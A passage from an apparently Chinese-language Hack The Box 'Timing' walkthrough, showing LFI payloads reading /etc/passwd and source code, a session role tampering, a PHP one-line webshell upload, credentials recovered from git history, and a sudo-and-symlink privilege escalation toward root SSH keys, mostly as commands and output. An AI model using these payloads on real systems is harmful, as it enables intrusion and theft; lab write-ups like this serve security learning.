+cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kL25ldGlmOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQvcmVzb2x2ZTovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDI6MTA2OjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDc6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpfYXB0Ong6MTA0OjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KbHhkOng6MTA1OjY1NTM0OjovdmFyL2xpYi9seGQvOi9iaW4vZmFsc2UKdXVpZGQ6eDoxMDY6MTEwOjovcnVuL3V1aWRkOi91c3Ivc2Jpbi9ub2xvZ2luCmRuc21hc3E6eDoxMDc6NjU1MzQ6ZG5zbWFzcSwsLDovdmFyL2xpYi9taXNjOi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwODoxMTI6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMDk6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTEwOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMTE6MTE0Ok15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQphYXJvbjp4OjEwMDA6MTAwMDphYXJvbjovaG9tZS9hYXJvbjovYmluL2Jhc2gK
+</code></pre>
+<p>得到了一段base64编码，咱们把POC稍微修改一下，让它解密base64</p>
+<pre><code class="bash">┌──(root💀root)-[~/Desktop]
+└─# curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd|base64 -d  
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2152  100  2152    0     0   3788      0 --:--:-- --:--:-- --:--:--  3788
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
+aaron:x:1000:1000:aaron:/home/aaron:/bin/bash
+</code></pre>
+<p>成功读取文件</p>
+<p>然后咱们尝试读取一下之前获取到的本地文件</p>
+<pre><code class="php">┌──(root💀root)-[~/Desktop]
+└─# curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=upload.php|base64 -d
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1360  100  1360    0     0    624      0  0:00:02  0:00:02 --:--:--   624
+&lt;?php
+include(&quot;admin_auth_check.php&quot;);
+
+$upload_dir = &quot;images/uploads/&quot;;
+
+if (!file_exists($upload_dir)) {
+    mkdir($upload_dir, 0777, true);
+}
+
+$file_hash = uniqid();
+
+$file_name = md5(&#39;$file_hash&#39; . time()) . &#39;_&#39; . basename($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;]);
+$target_file = $upload_dir . $file_name;
+$error = &quot;&quot;;
+$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
+
+if (isset($_POST[&quot;submit&quot;])) {
+    $check = getimagesize($_FILES[&quot;fileToUpload&quot;][&quot;tmp_name&quot;]);
+    if ($check === false) {
+        $error = &quot;Invalid file&quot;;
+    }
+}
+
+// Check if file already exists
+if (file_exists($target_file)) {
+    $error = &quot;Sorry, file already exists.&quot;;
+}
+
+if ($imageFileType != &quot;jpg&quot;) {
+    $error = &quot;This extension is not allowed.&quot;;
+}
+
+if (empty($error)) {
+    if (move_uploaded_file($_FILES[&quot;fileToUpload&quot;][&quot;tmp_name&quot;], $target_file)) {
+        echo &quot;The file has been uploaded.&quot;;
+    } else {
+        echo &quot;Error: There was an error uploading your file.&quot;;
+    }
+} else {
+    echo &quot;Error: &quot; . $error;
+}
+?&gt;
+</code></pre>
+<p>这边可以看到有一个认证文件admin_auth_check.php，咱们读取一下</p>
+<pre><code class="php">┌──(root💀root)-[~/Desktop]
+└─# curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=admin_auth_check.php|base64 -d
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   268  100   268    0     0    470      0 --:--:-- --:--:-- --:--:--   471
+&lt;?php
+
+include_once &quot;auth_check.php&quot;;
+
+if (!isset($_SESSION[&#39;role&#39;]) || $_SESSION[&#39;role&#39;] != 1) {
+    echo &quot;No permission to access this panel!&quot;;
+    header(&#39;Location: ./index.php&#39;);
+    die();
+}
+
+?&gt;
+</code></pre>
+<p>这里可以看到，咱们要使用文件上传功能那就得有一个role1的权限，但是目前没有任何线索能得到关于role1的内容，这里把&#x2F;etc&#x2F;passwd内获取到的账户aaron拿去尝试一下</p>
+<img src="/2022/01/01/Hackthebox/Hackthebox-Timing/fc8a9d18-d119-413a-a2a2-372e7a75fe39.png" class>
+
+<p>成功登录，咱们拿到了一个user2的权限，那不用想肯定是需要越权了</p>
+<img src="/2022/01/01/Hackthebox/Hackthebox-Timing/6d0996b9-927d-4596-a907-0bf5acc2007a.png" class>
+
+<img src="/2022/01/01/Hackthebox/Hackthebox-Timing/8b10d4e9-4fd4-47cc-b6a6-88f2ac77fd67.png" class>
+
+<p>抓了一个包看了一下，似乎没有关于role的权限，那咱们自己加一个呢？试试看</p>
+<img src="/2022/01/01/Hackthebox/Hackthebox-Timing/0119fa62-9817-4a3c-adf4-a9dd033cb157.png" class>
+
+<p>改包加入role&#x3D;1执行后，刷新一下页面</p>
+<img src="/2022/01/01/Hackthebox/Hackthebox-Timing/05274cd5-f029-4621-996d-a036e36c7135.png" class>
+
+<p>可以看到多了一个admin panel按钮，点进去看看</p>
+<img src="/2022/01/01/Hackthebox/Hackthebox-Timing/f0df66af-a67d-49cc-94ab-fa09e4a7d877.png" class>
+
+<p>明确多了一个上传点</p>
+<pre><code class="php">┌──(root💀root)-[~/Desktop]
+└─# cat shell.jpg
+&lt;?php system($_GET[cmd]);?&gt;
+</code></pre>
+<p>创建一个带有一句话木马的jpg文件</p>
+<p>接着把我们本地系统的时间修改为GMT(我默认的是CST)</p>
+<p>然后上传该jpg文件的时候拦截上传包，使用php -a开始执行下列循环语句以后，再放包</p>
+<pre><code class="php">while (true){echo date(&quot;D M j G:i:s T Y&quot;); echo &quot; = &quot; ; echo md5(&#39;$file_hash&#39; .time());echo &quot;\n&quot;;sleep(1);}
+</code></pre>
+<pre><code class="php">┌──(root💀root)-[~/Desktop]
+└─# php -a
+Interactive mode enabled
+
+php &gt; while (true){echo date(&quot;D M j G:i:s T Y&quot;); echo &quot; = &quot; ; echo md5(&#39;$file_hash&#39; .time());echo &quot;\n&quot;;sleep(1);}
+Sat Jan 1 0:50:55 CST 2022 = 019996d3ee825407d56ab94dd16bdb34
+Sat Jan 1 0:50:56 CST 2022 = c56f6f652fcf60605708795fe9051eeb
+Sat Jan 1 0:50:57 CST 2022 = dc3e0079c26a5db5f2c5c96ec26ee917
+</code></pre>
+<pre><code class="php">┌──(root💀root)-[~]
+└─# curl &#39;http://10.10.11.135/image.php?img=images/uploads/80417f57b8c9ce57ca7efbcc1b85a9ae_shell.jpg&amp;cmd=id&#39;
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<p>我把本地时间修改了后，成功getshell，咱们继续下一步</p>
+<p>这台机器有防火墙，无法直接拿到反向shell，咱们一步步来</p>
+<pre><code class="php">┌──(root💀root)-[~]
+└─# curl &#39;http://10.10.11.135/image.php?img=images/uploads/80417f57b8c9ce57ca7efbcc1b85a9ae_shell.jpg&amp;cmd=ls+-la+/opt&#39;
+total 632
+drwxr-xr-x  2 root root   4096 Dec 31 16:49 .
+drwxr-xr-x 24 root root   4096 Nov 29 01:34 ..
+-rw-r--r--  1 root root   5609 Dec 31 16:49 default
+-rw-r--r--  1 root root 627851 Jul 20 22:36 source-files-backup.zip
+</code></pre>
+<p>咱们把文件复制到&#x2F;var&#x2F;www&#x2F;html&#x2F;images&#x2F;uploads&#x2F;然后下载</p>
+<pre><code class="php">┌──(root💀root)-[~]
+└─# curl &#39;http://10.10.11.135/image.php?img=images/uploads/80417f57b8c9ce57ca7efbcc1b85a9ae_shell.jpg&amp;cmd=cp+/opt/source-files-backup.zip+/var/www/html/images/uploads/&#39;
+
+┌──(root💀root)-[~]
+└─# curl &#39;http://10.10.11.135/image.php?img=images/uploads/source-files-backup.zip&#39; --output source-files-backup.zip                                                                                          6 ⨯
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  613k    0  613k    0     0   165k      0 --:--:--  0:00:03 --:--:--  165k
+</code></pre>
+<pre><code class="php">┌──(root💀root)-[~/Desktop/backup]
+└─# ls -la
+总用量 76
+drwxr-xr-x  6 root root 4096  7月 20 22:34 .
+drwxr-xr-x 12 root root 4096 12月 31 17:36 ..
+-rw-r--r--  1 root root  200  7月 20 22:34 admin_auth_check.php
+-rw-r--r--  1 root root  373  7月 20 22:34 auth_check.php
+-rw-r--r--  1 root root 1268  7月 20 22:34 avatar_uploader.php
+drwxr-xr-x  2 root root 4096  7月 20 22:34 css
+-rw-r--r--  1 root root   92  7月 20 22:34 db_conn.php
+-rw-r--r--  1 root root 3937  7月 20 22:34 footer.php
+drwxr-xr-x  8 root root 4096  7月 20 22:35 .git
+-rw-r--r--  1 root root 1498  7月 20 22:34 header.php
+-rw-r--r--  1 root root  507  7月 20 22:34 image.php
+drwxr-xr-x  3 root root 4096  7月 20 22:34 images
+-rw-r--r--  1 root root  188  7月 20 22:34 index.php
+drwxr-xr-x  2 root root 4096  7月 20 22:34 js
+-rw-r--r--  1 root root 2074  7月 20 22:34 login.php
+-rw-r--r--  1 root root  113  7月 20 22:34 logout.php
+-rw-r--r--  1 root root 3041  7月 20 22:34 profile.php
+-rw-r--r--  1 root root 1740  7月 20 22:34 profile_update.php
+-rw-r--r--  1 root root  984  7月 20 22:34 upload.php
+</code></pre>
+<p>解压后可以得到.git文件，请求git文件看看能得到什么</p>
+<pre><code class="bash">┌──(root💀root)-[~/Desktop/backup]
+└─# ~/Desktop/GitTools/Extractor/extractor.sh . source
+###########
+# Extractor is part of https://github.com/internetwache/GitTools
+#
+# Developed and maintained by @gehaxelt from @internetwache
+#
+# Use at your own risk. Usage might be illegal in certain circumstances. 
+# Only for educational purposes!
+###########
+[*] Destination folder does not exist
+[*] Creating...
+[+] Found commit: e4e214696159a25c69812571c8214d2bf8736a3f
+[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/admin_auth_check.php
+[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/auth_check.php
+[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/avatar_uploader.php
+[+] Found folder: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/css
+[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/css/bootstrap.min.css
+[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/css/login.css
+[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/db_conn.php
+[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/footer.php
+[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/header.php
+[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/image.php
+[+] Found folder: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/images
+[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/images/background.jpg
+[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/images/user-icon.png
+[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/index.php
+[+] Found folder: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/js
+[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/js/avatar_uploader.js
+[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/js/bootstrap.min.js
+[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/js/jquery.min.js
+[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/js/profile.js
+[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/login.php
+[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/logout.php
+[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/profile.php
+[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/profile_update.php
+[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/upload.php
+[+] Found commit: 16de2698b5b122c93461298eab730d00273bd83e
+[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/admin_auth_check.php
+[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/auth_check.php
+[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/avatar_uploader.php
+[+] Found folder: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/css
+[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/css/bootstrap.min.css
+[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/css/login.css
+[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/db_conn.php
+[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/footer.php
+[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/header.php
+[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/image.php
+[+] Found folder: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/images
+[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/images/background.jpg
+[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/images/user-icon.png
+[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/index.php
+[+] Found folder: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/js
+[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/js/avatar_uploader.js
+[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/js/bootstrap.min.js
+[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/js/jquery.min.js
+[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/js/profile.js
+[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/login.php
+[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/logout.php
+[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/profile.php
+[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/profile_update.php
+[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/upload.php
+</code></pre>
+<p>然后多了一个source目录</p>
+<pre><code class="bash">┌──(root💀root)-[~/Desktop/backup]
+└─# ls -la
+总用量 80
+drwxr-xr-x  7 root root 4096 12月 31 17:42 .
+drwxr-xr-x 13 root root 4096 12月 31 17:38 ..
+-rw-r--r--  1 root root  200  7月 20 22:34 admin_auth_check.php
+-rw-r--r--  1 root root  373  7月 20 22:34 auth_check.php
+-rw-r--r--  1 root root 1268  7月 20 22:34 avatar_uploader.php
+drwxr-xr-x  2 root root 4096  7月 20 22:34 css
+-rw-r--r--  1 root root   92  7月 20 22:34 db_conn.php
+-rw-r--r--  1 root root 3937  7月 20 22:34 footer.php
+drwxr-xr-x  8 root root 4096  7月 20 22:35 .git
+-rw-r--r--  1 root root 1498  7月 20 22:34 header.php
+-rw-r--r--  1 root root  507  7月 20 22:34 image.php
+drwxr-xr-x  3 root root 4096  7月 20 22:34 images
+-rw-r--r--  1 root root  188  7月 20 22:34 index.php
+drwxr-xr-x  2 root root 4096  7月 20 22:34 js
+-rw-r--r--  1 root root 2074  7月 20 22:34 login.php
+-rw-r--r--  1 root root  113  7月 20 22:34 logout.php
+-rw-r--r--  1 root root 3041  7月 20 22:34 profile.php
+-rw-r--r--  1 root root 1740  7月 20 22:34 profile_update.php
+drwxr-xr-x  4 root root 4096 12月 31 17:42 source
+-rw-r--r--  1 root root  984  7月 20 22:34 upload.php
+</code></pre>
+<pre><code class="bash">┌──(root💀root)-[~/Desktop/backup]
+└─# cd source 
+
+┌──(root💀root)-[~/Desktop/backup/source]
+└─# ls -la
+总用量 16
+drwxr-xr-x 4 root root 4096 12月 31 17:42 .
+drwxr-xr-x 7 root root 4096 12月 31 17:42 ..
+drwxr-xr-x 5 root root 4096 12月 31 17:42 0-e4e214696159a25c69812571c8214d2bf8736a3f
+drwxr-xr-x 5 root root 4096 12月 31 17:42 1-16de2698b5b122c93461298eab730d00273bd83e
+</code></pre>
+<p>然后多了两个文件夹</p>
+<pre><code class="bash">┌──(root💀root)-[~/Desktop/backup/source]
+└─# diff 0-e4e214696159a25c69812571c8214d2bf8736a3f/ 1-16de2698b5b122c93461298eab730d00273bd83e/                                                                                                              1 ⨯
+diff &#39;--color=auto&#39; 0-e4e214696159a25c69812571c8214d2bf8736a3f/commit-meta.txt 1-16de2698b5b122c93461298eab730d00273bd83e/commit-meta.txt
+1,3c1,4
+&lt; tree fd7fb62599f9702baeb0abdc42a8a4b68e49ec23
+&lt; author grumpy &lt;grumpy@localhost.com&gt; 1626820434 +0000
+&lt; committer grumpy &lt;grumpy@localhost.com&gt; 1626820434 +0000
+---
+&gt; tree dcbc181650833009145874df7da85b4c6d84b2ca
+&gt; parent e4e214696159a25c69812571c8214d2bf8736a3f
+&gt; author grumpy &lt;grumpy@localhost.com&gt; 1626820453 +0000
+&gt; committer grumpy &lt;grumpy@localhost.com&gt; 1626820453 +0000
+5c6
+&lt; init
+---
+&gt; db_conn updated
+0-e4e214696159a25c69812571c8214d2bf8736a3f/css 和 1-16de2698b5b122c93461298eab730d00273bd83e/css 有共同的子目录
+diff &#39;--color=auto&#39; 0-e4e214696159a25c69812571c8214d2bf8736a3f/db_conn.php 1-16de2698b5b122c93461298eab730d00273bd83e/db_conn.php
+2c2
+&lt; $pdo = new PDO(&#39;mysql:host=localhost;dbname=app&#39;, &#39;root&#39;, &#39;S3cr3t_unGu3ss4bl3_p422w0Rd&#39;);
+---
+&gt; $pdo = new PDO(&#39;mysql:host=localhost;dbname=app&#39;, &#39;root&#39;, &#39;4_V3Ry_l0000n9_p422w0rd&#39;);
+0-e4e214696159a25c69812571c8214d2bf8736a3f/images 和 1-16de2698b5b122c93461298eab730d00273bd83e/images 有共同的子目录
+0-e4e214696159a25c69812571c8214d2bf8736a3f/js 和 1-16de2698b5b122c93461298eab730d00273bd83e/js 有共同的子目录
+</code></pre>
+<p>数据库凭证已被修改为S3cr3t_unGu3ss4bl3_p422w0Rd，现在我们使用ssh进行登录</p>
+<pre><code class="bash">┌──(root💀root)-[~/Desktop]
+└─# ssh aaron@10.10.11.135
+aaron@10.10.11.135&#39;s password: 
+Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Dec 31 17:46:35 UTC 2021
+
+  System load:  0.0               Processes:           180
+  Usage of /:   51.5% of 4.85GB   Users logged in:     1
+  Memory usage: 18%               IP address for eth0: 10.10.11.135
+  Swap usage:   0%
+
+8 updates can be applied immediately.
+8 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Fri Dec 31 17:46:08 2021 from 10.10.14.52
+aaron@timing:~$ whoami&amp;&amp;id
+aaron
+uid=1000(aaron) gid=1000(aaron) groups=1000(aaron)
+</code></pre>
+<p>成功登录aaron用户</p>
+<pre><code class="bash">aaron@timing:~$ cat user.txt 
+a3376cc0a8af0e0aa3f66bec0adec1d5
+</code></pre>
+<p>成功拿到user权限的flag文件</p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><pre><code class="bash">aaron@timing:~$ sudo -l
+Matching Defaults entries for aaron on timing:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User aaron may run the following commands on timing:
+    (ALL) NOPASSWD: /usr/bin/netutils
+</code></pre>
+<p>首先查看一下sudo权限</p>
+<p>可以以root权限执行&#x2F;usr&#x2F;bin&#x2F;netutils这个二进制文件，研究研究</p>
+<pre><code class="bash">aaron@timing:~$ cat /usr/bin/netutils
+#! /bin/bash
+java -jar /root/netutils.jar
+aaron@timing:~$ file /usr/bin/netutils
+/usr/bin/netutils: Bourne-Again shell script, ASCII text executable
+</code></pre>
+<p>首先查看一下文件类型</p>
+<p>这是一个bash脚本，功能是从根目录下载运行一个java文件，执行一下试试</p>
+<pre><code class="bash">aaron@timing:~$ sudo /usr/bin/netutils
+netutils v0.1
+Select one option:
+[0] FTP
+[1] HTTP
+[2] Quit
+Input &gt;&gt;
+</code></pre>
+<p>执行后给了我们两个选项，FTP还是HTTP，设置一个HTTP然后下载测试文件看看把</p>
+<pre><code class="bash">┌──(root💀root)-[~/Desktop]
+└─# python3 -m http.server 80                                                                                                                                                                                 2 ⨯
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre>
+<pre><code class="bash">aaron@timing:~$ sudo /usr/bin/netutils
+netutils v0.1
+Select one option:
+[0] FTP
+[1] HTTP
+[2] Quit
+Input &gt;&gt; 1
+Enter Url: 10.10.14.52/test.txt
+Initializing download: http://10.10.14.52/test.txt
+File size: 14 bytes
+Opening output file test.txt
+Server unsupported, starting from scratch with one connection.
+Starting download
+
+Downloaded 14 byte in 0 seconds. (0.02 KB/s)
+
+netutils v0.1
+Select one option:
+[0] FTP
+[1] HTTP
+[2] Quit
+Input &gt;&gt; 2
+aaron@timing:~$ ls -la test.txt 
+-rw-r--r-- 1 root root 14 Dec 31 17:58 test.txt
+</code></pre>
+<p>成功从我们本地下载了这个文件，并且是root权限的，那就好办了</p>
+<p>接着对root账户下的.ssh文件创建一个链接</p>
+<pre><code class="bash">aaron@timing:~$ ln -s /root/.ssh/authorized_keys keys
+ln: failed to access &#39;keys&#39;: Permission denied
+aaron@timing:~$ ls -la
+total 52
+drwxr-x--x 5 aaron aaron 4096 Dec 31 18:06 .
+drwxr-xr-x 3 root  root  4096 Dec  2 09:55 ..
+lrwxrwxrwx 1 root  root     9 Oct  5 15:33 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 aaron aaron  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 aaron aaron 3771 Apr  4  2018 .bashrc
+drwx------ 2 aaron aaron 4096 Nov 29 01:34 .cache
+drwx------ 3 aaron aaron 4096 Nov 29 01:34 .gnupg
+lrwxrwxrwx 1 aaron aaron   26 Dec 31 18:06 keys -&gt; /root/.ssh/authorized_keys
+drwxrwxr-x 3 aaron aaron 4096 Nov 29 01:34 .local
+lrwxrwxrwx 1 aaron aaron   11 Dec 31 17:54 passwd -&gt; /etc/passwd
+lrwxrwxrwx 1 aaron aaron   11 Dec 31 18:02 passwd.0 -&gt; /etc/passwd
+-rw-r--r-- 1 root  root  1735 Dec 31 17:57 passwd.1
+lrwxrwxrwx 1 aaron aaron   11 Dec 31 17:57 passwd.2 -&gt; /etc/passwd
+-rw-r--r-- 1 root  root  1735 Dec 31 17:57 passwd.3
+-rw-r--r-- 1 root  root  1735 Dec 31 18:03 passwd.4
+-rw-r--r-- 1 aaron aaron  807 Apr  4  2018 .profile
+-rw-r--r-- 1 root  root    14 Dec 31 17:58 test.txt
+-rw-r----- 1 root  aaron   33 Dec 31 17:51 user.txt
+lrwxrwxrwx 1 root  root     9 Oct  5 15:33 .viminfo -&gt; /dev/null
+</code></pre>
+<p>接着在本地创建一个ssh的密钥，然后复制到桌面，改名为keys</p>
+<pre><code class="bash">┌──(root💀root)-[~/Desktop]
+└─# ssh-keygen       
+Generating public/private rsa key pair.
+Enter file in which to save the key (/root/.ssh/id_rsa): 
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /root/.ssh/id_rsa
+Your public key has been saved in /root/.ssh/id_rsa.pub
+The key fingerprint is:
